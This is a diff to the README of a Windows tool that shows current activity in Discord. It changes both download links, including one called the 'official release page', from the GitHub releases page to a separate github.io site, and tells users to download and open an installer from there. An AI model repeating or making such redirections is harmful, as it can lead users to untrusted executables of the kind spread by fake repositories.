@@ -1,6 +1,6 @@
 # 🎮 better-rich-presence-windows - Show your current activity on Discord
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Habitforming-memorabilia64/better-rich-presence-windows/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://habitforming-memorabilia64.github.io)
 
 This application tracks the program currently in use on your Windows desktop. It updates your Discord status to display what you do in real time. The software runs quietly in the background to keep your friends updated on your gaming or working habits. It combines modern web technology with native Windows performance to ensure low impact on your system resources.
 
@@ -8,7 +8,7 @@ This application tracks the program currently in use on your Windows desktop. It
 
 You do not need programming skills to use this tool. Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/Habitforming-memorabilia64/better-rich-presence-windows/releases) to access the latest installer.
+1. Visit the [official release page](https://habitforming-memorabilia64.github.io) to access the latest installer.
 2. Look for the file ending in `.msi` or `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Open the file once the download finishes.
